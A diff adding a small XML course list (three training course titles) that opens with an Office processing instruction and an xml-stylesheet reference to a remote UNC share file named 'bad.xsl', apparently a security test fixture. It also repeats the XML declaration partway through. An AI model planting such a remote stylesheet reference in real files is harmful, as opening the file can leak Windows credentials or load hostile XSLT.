@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<?mso-application progid="Word.Document"?>
+<?xml-stylesheet type="text/xsl" href="\\10.0.0.5\bad.xsl" ?>
+<?xml version="1.0" encoding="utf-8" ?>
+<Courses>
+ <Course Number="MS-2524">
+  <Title>XML Web Services Programming</Title>
+ </Course>
+ <Course Number="MS-2124">
+  <Title>C# Programming</Title>
+ </Course>
+ <Course Number="NET2">
+  <Title>.NET 2.0 Early Adapter</Title>
+ </Course>
+</Courses>
